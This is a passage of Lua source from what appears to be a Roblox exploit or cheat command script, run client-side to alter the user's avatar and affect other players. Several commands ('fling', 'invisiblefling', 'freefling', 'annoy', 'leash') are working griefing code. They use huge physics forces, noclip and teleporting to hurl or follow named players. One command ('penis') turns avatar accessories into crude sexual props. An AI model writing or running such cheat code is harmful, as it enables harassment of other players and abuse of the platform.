	T2.TextSize = 12

	XE_2.Name = "XE"
	XE_2.Parent = T2
	XE_2.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_2.BorderSizePixel = 0
	XE_2.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_2.Size = UDim2.new(0, 19, 0, 18)
	XE_2.Font = Enum.Font.SourceSansBold
	XE_2.Text = "+"
	XE_2.TextColor3 = Color3.new(1, 1, 1)
	XE_2.TextSize = 14
	XE_2.MouseButton1Down:Connect(function()
		arguments = T2.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T4.Name = "T4"
	T4.Parent = HoldTab
	T4.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T4.BorderSizePixel = 0
	T4.Position = UDim2.new(-9.31322575e-10, 0, 0.348800778, 0)
	T4.Size = UDim2.new(0, 141, 0, 18)
	T4.Text = ""
	T4.TextColor3 = Color3.new(1, 1, 1)
	T4.TextSize = 12

	XE_3.Name = "XE"
	XE_3.Parent = T4
	XE_3.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_3.BorderSizePixel = 0
	XE_3.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_3.Size = UDim2.new(0, 19, 0, 18)
	XE_3.Font = Enum.Font.SourceSansBold
	XE_3.Text = "+"
	XE_3.TextColor3 = Color3.new(1, 1, 1)
	XE_3.TextSize = 14
	XE_3.MouseButton1Down:Connect(function()
		arguments = T4.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T3.Name = "T3"
	T3.Parent = HoldTab
	T3.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T3.BorderSizePixel = 0
	T3.Position = UDim2.new(-9.31322575e-10, 0, 0.270369381, 0)
	T3.Size = UDim2.new(0, 141, 0, 18)
	T3.Text = ""
	T3.TextColor3 = Color3.new(1, 1, 1)
	T3.TextSize = 12

	XE_4.Name = "XE"
	XE_4.Parent = T3
	XE_4.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_4.BorderSizePixel = 0
	XE_4.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_4.Size = UDim2.new(0, 19, 0, 18)
	XE_4.Font = Enum.Font.SourceSansBold
	XE_4.Text = "+"
	XE_4.TextColor3 = Color3.new(1, 1, 1)
	XE_4.TextSize = 14
	XE_4.MouseButton1Down:Connect(function()
		arguments = T3.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T8.Name = "T8"
	T8.Parent = HoldTab
	T8.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T8.BorderSizePixel = 0
	T8.Position = UDim2.new(-9.31322575e-10, 0, 0.669062257, 0)
	T8.Size = UDim2.new(0, 141, 0, 18)
	T8.Text = ""
	T8.TextColor3 = Color3.new(1, 1, 1)
	T8.TextSize = 12

	XE_5.Name = "XE"
	XE_5.Parent = T8
	XE_5.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_5.BorderSizePixel = 0
	XE_5.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_5.Size = UDim2.new(0, 19, 0, 18)
	XE_5.Font = Enum.Font.SourceSansBold
	XE_5.Text = "+"
	XE_5.TextColor3 = Color3.new(1, 1, 1)
	XE_5.TextSize = 14
	XE_5.MouseButton1Down:Connect(function()
		arguments = T8.Text:split(" ")
		useCommand[arguments[1]]()
	end)
	T6.Name = "T6"
	T6.Parent = HoldTab
	T6.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T6.BorderSizePixel = 0
	T6.Position = UDim2.new(0, 0, 0.508931518, 0)
	T6.Size = UDim2.new(0, 141, 0, 18)
	T6.Text = ""
	T6.TextColor3 = Color3.new(1, 1, 1)
	T6.TextSize = 12

	XE_6.Name = "XE"
	XE_6.Parent = T6
	XE_6.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_6.BorderSizePixel = 0
	XE_6.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_6.Size = UDim2.new(0, 19, 0, 18)
	XE_6.Font = Enum.Font.SourceSansBold
	XE_6.Text = "+"
	XE_6.TextColor3 = Color3.new(1, 1, 1)
	XE_6.TextSize = 14
	XE_6.MouseButton1Down:Connect(function()
		arguments = T6.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T5.Name = "T5"
	T5.Parent = HoldTab
	T5.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T5.BorderSizePixel = 0
	T5.Position = UDim2.new(0, 0, 0.43050012, 0)
	T5.Size = UDim2.new(0, 141, 0, 18)
	T5.Text = ""
	T5.TextColor3 = Color3.new(1, 1, 1)
	T5.TextSize = 12

	XE_7.Name = "XE"
	XE_7.Parent = T5
	XE_7.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_7.BorderSizePixel = 0
	XE_7.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_7.Size = UDim2.new(0, 19, 0, 18)
	XE_7.Font = Enum.Font.SourceSansBold
	XE_7.Text = "+"
	XE_7.TextColor3 = Color3.new(1, 1, 1)
	XE_7.TextSize = 14
	XE_7.MouseButton1Down:Connect(function()
		arguments = T5.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T7.Name = "T7"
	T7.Parent = HoldTab
	T7.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T7.BorderSizePixel = 0
	T7.Position = UDim2.new(-9.31322575e-10, 0, 0.590630829, 0)
	T7.Size = UDim2.new(0, 141, 0, 18)
	T7.Text = ""
	T7.TextColor3 = Color3.new(1, 1, 1)
	T7.TextSize = 12

	XE_8.Name = "XE"
	XE_8.Parent = T7
	XE_8.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_8.BorderSizePixel = 0
	XE_8.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_8.Size = UDim2.new(0, 19, 0, 18)
	XE_8.Font = Enum.Font.SourceSansBold
	XE_8.Text = "+"
	XE_8.TextColor3 = Color3.new(1, 1, 1)
	XE_8.TextSize = 14
	XE_8.MouseButton1Down:Connect(function()
		arguments = T7.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T9.Name = "T9"
	T9.Parent = HoldTab
	T9.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T9.BorderSizePixel = 0
	T9.Position = UDim2.new(-1.39698386e-09, 0, 0.750761628, 0)
	T9.Size = UDim2.new(0, 141, 0, 18)
	T9.Text = ""
	T9.TextColor3 = Color3.new(1, 1, 1)
	T9.TextSize = 12

	XE_9.Name = "XE"
	XE_9.Parent = T9
	XE_9.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE_9.BorderSizePixel = 0
	XE_9.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE_9.Size = UDim2.new(0, 19, 0, 18)
	XE_9.Font = Enum.Font.SourceSansBold
	XE_9.Text = "+"
	XE_9.TextColor3 = Color3.new(1, 1, 1)
	XE_9.TextSize = 14
	XE_9.MouseButton1Down:Connect(function()
		arguments = T9.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T1.Text = CMDTab[1]
	T2.Text = CMDTab[2]
	T3.Text = CMDTab[3]
	T4.Text = CMDTab[4]
	T5.Text = CMDTab[5]
	T6.Text = CMDTab[6]
	T7.Text = CMDTab[7]
	T8.Text = CMDTab[8]
	T9.Text = CMDTab[9]

	function useCommand.nugget()
		opx("-","Changed character into a nugget")
		if cmd15(cmdlp) then
			for i,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "RightUpperArm" or v.Name == "LeftUpperArm" or v.Name == "RightUpperLeg" or v.Name == "LeftUpperLeg" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "Right Arm" or v.Name == "Left Arm" or v.Name == "Right Leg" or v.Name == "Left Leg" then
					v:Destroy()
				end
			end
		end
		cmdlp.Character.Head.Mesh:Destroy()
	end

	local cwFlipping = false
	function useCommand.cartwheel()
		opx("-","Now cartwheeling")
		cwFlipping = true
		function _restoreproperties()
			Torso = cmdlp.Character:FindFirstChild("Torso")
			RightS = Torso:FindFirstChild("Right Shoulder")
			LeftS = Torso:FindFirstChild("Left Shoulder")
			RightH = Torso:FindFirstChild("Right Hip")
			LeftH = Torso:FindFirstChild("Left Hip")
			RightS.MaxVelocity = .15
			LeftS.MaxVelocity = .15
			RightH.MaxVelocity = .1
			LeftH.MaxVelocity = .1
			RightS.DesiredAngle = 0
			LeftS.DesiredAngle = 0
			LeftH.DesiredAngle = 0
			RightH.DesiredAngle = 0
		end
		function Down(ml)
			for i = 1,ml.velocity.y/3 do
				ml.velocity = ml.velocity + Vector3.new(0,-4.25,0)
				wait()
			end
			ml:Remove()
		end
		function Flip()
			if debounce == true then return end
			debounce = true
			local Gyro = Instance.new("BodyGyro")
			Gyro.P = Gyro.P*10
			Gyro.maxTorque = Vector3.new(100000,100000,100000)*999
			Gyro.CFrame = cmdlp.Character.Torso.CFrame
			Gyro.Parent = cmdlp.Character.Torso
			for i=0, 50 do
				Gyro.CFrame = Gyro.CFrame*CFrame.fromEulerAnglesXYZ(math.pi/-29,0,0)
				wait()
			end
			Gyro.CFrame = cmdlp.Character.Torso.CFrame
			wait()
			Gyro:Remove()
			cmdlp.Character.Humanoid.PlatformStand = false
			_restoreproperties()
			debounce = false
		end
		while cwFlipping do
			wait()
			Flip()
		end
	end

	function useCommand.uncartwheel()
		cwFlipping = false
		opx("-","No longer cartwheeling")
	end

	local seizureFlipping = false
	function useCommand.seizure()
		opx("-","Now seizuring")
		seizureFlipping = true
		function _restoreproperties()
			Torso = cmdlp.Character:FindFirstChild("Torso")
			RightS = Torso:FindFirstChild("Right Shoulder")
			LeftS = Torso:FindFirstChild("Left Shoulder")
			RightH = Torso:FindFirstChild("Right Hip")
			LeftH = Torso:FindFirstChild("Left Hip")
			RightS.MaxVelocity = .15
			LeftS.MaxVelocity = .15
			RightH.MaxVelocity = .1
			LeftH.MaxVelocity = .1
			RightS.DesiredAngle = 0
			LeftS.DesiredAngle = 0
			LeftH.DesiredAngle = 0
			RightH.DesiredAngle = 0
		end
		function Down(ml)
			for i = 1,ml.velocity.y/3 do
				ml.velocity = ml.velocity + Vector3.new(0,-4.25,0)
				wait()
			end
			ml:Remove()
		end
		function Flip4()
			if debounce == true then return end
			debounce = true
			cmdlp.Character.Humanoid.PlatformStand = true
			local VelUp = Instance.new("BodyVelocity")
			VelUp.maxForce = Vector3.new(10000,10000,10000)*999
			VelUp.Parent = cmdlp.Character.Torso
			coroutine.resume(coroutine.create(Down),VelUp)
			local Gyro = Instance.new("BodyGyro")
			Gyro.P = Gyro.P*10
			Gyro.CFrame = cmdlp.Character.Torso.CFrame
			Gyro.Parent = cmdlp.Character.Torso
			for i=1, 16 do
				Gyro.CFrame = Gyro.CFrame*CFrame.fromEulerAnglesXYZ(math.pi/9,math.pi/-18,0)
				wait()
			end
			Gyro.CFrame = cmdlp.Character.Torso.CFrame
			wait()
			Gyro:Remove()
			cmdlp.Character.Humanoid.PlatformStand = false
			_restoreproperties()
			debounce = false
		end
		while seizureFlipping do
			wait()
			Flip4()
		end
	end

	function useCommand.unseizure()
		seizureFlipping = false
		opx("-","No longer seizuring")
	end

	function useCommand.fling()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				noclip()
				PF = 99
				PF = PF*10
				local BT = Instance.new("BodyThrust")
				cmdhrp = cmdlp.Character.HumanoidRootPart
				BT.Parent = cmdhrp
				BT.Force = Vector3.new(PF, 0, PF)
				BT.Location = cmdhrp.Position
				for i,player in pairs(cmdlp.Character:GetChildren()) do
					if player.ClassName == "Part" then
						player.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
					end
				end
				cmdhrp.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(0), 0) * CFrame.new(0, 0, 0)
				wait(1)
				for i,player in pairs(cmdlp.Character:GetChildren()) do
					if player.ClassName == "Part" then
						player.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
					end
				end
				if Noclipping then
					Noclipping:Disconnect()
				end
				Clip = true
				cmdlp.Character.HumanoidRootPart.BodyThrust:Destroy()
				cmdlp.Character.Humanoid.PlatformStand = true
				cmdlp.Character.Humanoid.Sit = true
				wait(0.1)
				cmdlp.Character.Humanoid.Jump = true
				opx("-","Flung "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.invisiblefling()
		opx("-","Now Invisible Flinging use refresh to stop")
		local ch = cmdlp.Character
		local prt=Instance.new("Model", cmdlp.Character)
		local z1 = Instance.new("Part")
		z1.Name="Torso"
		z1.CanCollide = false
		z1.Anchored = true
		local z2 = Instance.new("Part", prt)
		z2.Name="Head"
		z2.Anchored = true
		z2.CanCollide = false
		local z3 =Instance.new("Humanoid", prt)
		z3.Name="Humanoid"
		z1.Position = Vector3.new(0,9999,0)
		cmdlp.Character=prt
		wait(3)
		cmdlp.Character=ch
		wait(3)
		local plr = cmdlp
		cmdm = plr:GetMouse()
		local Hum = Instance.new("Humanoid")
		z2:Clone()
		Hum.Parent = cmdlp.Character
		local root =  cmdlp.Character.HumanoidRootPart
		for i,v in pairs(plr.Character:GetChildren()) do
			if v ~= root and  v.Name ~= "Humanoid" then
				v:Destroy()
			end
		end
		root.Transparency = 0
		root.Material = "ForceField"
		root.Color = Color3.new(1, 1, 1)
		game:GetService('RunService').Stepped:connect(function()
			cmdlp.Character.HumanoidRootPart.CanCollide = false
		end)
		game:GetService('RunService').RenderStepped:connect(function()
			cmdlp.Character.HumanoidRootPart.CanCollide = false
		end)
		sFLY()
		workspace.CurrentCamera.CameraSubject = root
		PF = 99999
		PF = PF*10
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = cmdlp.Character.HumanoidRootPart
		bambam.Force = Vector3.new(PF,0,PF)
		bambam.Location = cmdlp.Character.HumanoidRootPart.Position
	end

	function useCommand.freefling()
		opx("-","Now freeflinging use unfling to stop")
		noclip()
		sFLY()
		workspace.CurrentCamera.CameraSubject = cmdlp.Character.HumanoidRootPart
		local BT = Instance.new("BodyThrust")
		BT.Parent = cmdlp.Character.HumanoidRootPart
		BT.Force = Vector3.new(999999, 999999, 999999)
		BT.Location = cmdlp.Character.HumanoidRootPart.Position
		for i,player in pairs(cmdlp.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
			end
		end
	end

	function useCommand.unfling()
		opx("-","You are no longer flinging")
		for i,player in pairs(cmdlp.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
		if Noclipping then
			Noclipping:Disconnect()
		end
		Clip = true
		FLYING = false
		cmdlp.Character.HumanoidRootPart.BodyThrust:Destroy()
		cmdlp.Character.Humanoid.PlatformStand = true
		cmdlp.Character.Humanoid.Sit = true
		wait(0.1)
		cmdlp.Character.Humanoid.Jump = true
	end

	RestoreCFling = {}
	function useCommand.cleanfling()
		local tool = cmdlp.Character:FindFirstChildOfClass("Tool")
		if tool then
			opx("-","Now clean flinging")
			tool.Parent = cmdlp.Backpack
			tool.Handle.Massless = true
			RestoreCFling = {
				Anim = cmdlp.Character.Animate.toolnone.ToolNoneAnim.AnimationId;
				Grip = tool.GripPos;
			}
			tool.GripPos = Vector3.new(5000, 5000, 5000)
			cmdlp.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
			tool.Parent = cmdlp.Character
			pcall(function() cmdlp.Character.Animate.toolnone.ToolNoneAnim.AnimationId = "nil" end)
			wait(.1)
			tool.Parent = cmdlp.Backpack
			wait(.1)
			tool.Parent = cmdlp.Character
			noclip()
		else
			opx("*","You have no tool equipped!")
		end
	end

	function useCommand.uncleanfling()
		opx("-","No longer clean flinging")
		cmdlp.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		cmdlp.Character.Animate.toolnone.ToolNoneAnim.AnimationId = RestoreCFling.Anim
		local tool = cmdlp.Character:FindFirstChildOfClass("Tool")
		if tool then
			tool.GripPos = RestoreCFling.Grip
		end
	end

	function useCommand.notoolanim()
		pcall(function() cmdlp.Character.Animate.toolnone.ToolNoneAnim.AnimationId = "nil" end)
		opx("-","You now have no tool anim")
		local tool = cmdlp.Character:FindFirstChildOfClass("Tool")
		if tool then
			wait(.1)
			tool.Parent = cmdlp.Backpack
			wait(.1)
			tool.Parent = cmdlp.Character
		end
	end

	local Lagging = false
	function useCommand.lag()
		opx("-","Now lagging character")
		Lagging = true
		repeat wait()
			cmdlp.Character.HumanoidRootPart.Anchored = false
			wait(.1)
			cmdlp.Character.HumanoidRootPart.Anchored = true
			wait(.1)
		until Lagging == false
	end

	function useCommand.unlag()
		Lagging = false
		opx("No longer lagging character")
		wait(.3)
		cmdlp.Character.HumanoidRootPart.Anchored = false
	end

	local Annoy = false
	function useCommand.annoy()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					Annoy = true
					opx("-","Now annoying "..target.Name)
					while Annoy do
						cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,0,0)
						wait()
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unannoy()
		Annoy = false
		opx("-","No longer annoying")
	end

	function useCommand.weaken()
		for i,player in pairs(cmdlp.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
			end
		end
		opx("-","You are now weak")
	end

	function useCommand.strengthen()
		for i,player in pairs(cmdlp.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
			end
		end
		opx("-","You are now strong")
	end

	function useCommand.unweak()
		for i,player in pairs(cmdlp.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
		opx("-","You are no longer weak/strong")
	end

	function useCommand.sparkles()
		opx("-","If you had a Fairy it now makes a sparkles illusion")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = hat.Name
				tool.GripPos = Vector3.new(1.5, 0, -1.5)
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
	end

	function useCommand.sword()
		opx("-","If you had a Sword on your back you are now holding it")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = hat.Name
				tool.GripPos = Vector3.new(2, 2, 0)
				tool.GripRight = Vector3.new(9, 9, 9)
				tool.GripUp = Vector3.new(-9, -9, 0)
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://28090109"
		local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
		while wait() do
			for i,v in pairs(cmdlp.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Equipped:Connect(function(Mouse)
						Mouse.Button1Down:Connect(function()
							play:Play()
						end)
					end)
				end
			end
		end
	end

	function useCommand.scythe()
		opx("-","If you had a Scythe on your back you are now holding it")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = hat.Name
				tool.GripPos = Vector3.new(-0.8, -2, 0)
				tool.GripRight = Vector3.new(0, 0, 0)
				tool.GripUp = Vector3.new(9, 9, -3)
				tool.GripForward = Vector3.new(0, 0, 0)
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://28090109"
		local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
		while wait() do
			for i,v in pairs(cmdlp.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Equipped:Connect(function(Mouse)
						Mouse.Button1Down:Connect(function()
							play:Play()
						end)
					end)
				end
			end
		end
	end

	local Follow = false
	function useCommand.leash()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
					if hat.Handle ~= nil then
						if hat.Name == "FurryCatTail" then
							local tool = Instance.new("Tool", cmdlp.Backpack)
							tool.Name = target.Name.."s leash"
							tool.Parent = cmdp.LocalPlayer.Character
							tool.GripPos = Vector3.new(0, 0, 1)
							tool.GripRight = Vector3.new(1,1,0)
							tool.GripUp = Vector3.new(-9,-3,0)
							local hathandle = hat.Handle
							hathandle:FindFirstChildOfClass("Weld"):Destroy()
							hathandle.Parent = tool
							hathandle.Massless = true
						elseif hat.Name == "Spike Necklace" then
							local tool = Instance.new("Tool", cmdlp.Backpack)
							tool.Name = target.Name.."s collar"
							tool.Parent = cmdp.LocalPlayer.Character
							tool.GripPos = Vector3.new(0.6, -0.6, 3)
							local hathandle = hat.Handle
							hathandle:FindFirstChildOfClass("Weld"):Destroy()
							hathandle.Parent = tool
							hathandle.Massless = true
						end
					end
				end
				flwnum = -4.5
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					Follow = true
					opx("-","Now leashing "..target.Name)
					while Follow do
						cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(-0.9,0,4.5)
						wait()
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.penis()
		opx("-","You boutta ro-cum bro?")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				if v.Handle.SpecialMesh.TextureId == "http://www.roblox.com/asset/?id=4390955131" then
					v.Name = cmdlp.Name.."'s huge shaft"
				end
			end
		end
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				if v.Handle.SpecialMesh.TextureId == "http://www.roblox.com/asset/?id=4566834838" then
					v.Name = cmdlp.Name.."'s right ball"
				end
			end
		end
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				if v.Handle.SpecialMesh.TextureId == "http://www.roblox.com/asset/?id=4524758175" then
					v.Name = cmdlp.Name.."'s left ball"
				end
			end
		end
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				if hat.Name == cmdlp.Name.."'s huge shaft" then
					tool.Name = hat.Name
					tool.Parent = cmdlp.Character
					hat.Handle.SpecialMesh:Destroy()
					tool.GripPos = Vector3.new(-1, 2, 1.5)
					tool.GripRight = Vector3.new(0, 0, 0)
					tool.GripUp = Vector3.new(9, 9, 0)
					tool.GripForward = Vector3.new(0, 0, 0)
				elseif hat.Name == cmdlp.Name.."'s right ball" then
					tool.Name = hat.Name
					tool.Parent = cmdlp.Character
					hat.Handle.SpecialMesh:Destroy()
					tool.GripPos = Vector3.new(0.5, 2, 0.5)
					tool.GripRight = Vector3.new(0, 0, 0)
					tool.GripUp = Vector3.new(9, 9, 0)
					tool.GripForward = Vector3.new(0, 0, 0)
				elseif hat.Name == cmdlp.Name.."'s left ball" then
					tool.Name = hat.Name
					tool.Parent = cmdlp.Character
					hat.Handle.SpecialMesh:Destroy()
					tool.GripPos = Vector3.new(0.5, 2, 2.5)
					tool.GripRight = Vector3.new(0, 0, 0)
					tool.GripUp = Vector3.new(9, 9, 0)
					tool.GripForward = Vector3.new(0, 0, 0)
				end
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
	end

	function useCommand.animation()
		if arguments[2] and cmdnum(arguments[2]) then
			if cmd6(cmdlp) then
				local AnimationId = tostring(arguments[2])
				local Animprefix = Instance.new("Animation")
				Animprefix.AnimationId = "rbxassetid://"..AnimationId
				local animplay = cmdlp.Character.Humanoid:LoadAnimation(Animprefix)
				animplay:Play()
				if arguments[3] and cmdnum(arguments[3]) then
					animplay:AdjustSpeed(arguments[3])
				end
				opx("-","Now playing animation: "..arguments[2])
			else
				opx("*","R6 is needed for this command")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unanimation()
		for i,v in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		opx("-","Stopped all aniamtions")
	end

	function useCommand.uninsane()
		opx("-","You are no longer insane")
		insane:Stop()
		Spas:Destroy()
	end

	function useCommand.monstermash()
		if cmd6(cmdlp) then
			local AnimationId = "35654637"
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
			play:Play()
			opx("-","Now playing animation: 35654637")
		else
			opx("*","R6 is needed for this command")
		end
	end

	function useCommand.ragdoll()
		opx("-","Now ragdolling")
		cmdlp.Character.Humanoid.PlatformStand = true
	end

	function useCommand.unragdoll()
		opx("-","No longer ragdolling")
		cmdlp.Character.Humanoid.PlatformStand = false
	end

	function useCommand.animpack()
		local animpack = arguments[2]:lower()
		if animpack == "sneaky" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1132500520"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1132506407"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
		elseif animpack == "old" then
			local Char = cmdlp.Character
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=387947158"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=387947464"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=387947975"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616092998"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616094091"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=382460631"
		elseif animpack == "toy" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=782844582"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=782845186"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
		elseif animpack == "pirate" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=750784579"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=750785176"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
		elseif animpack == "knight" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
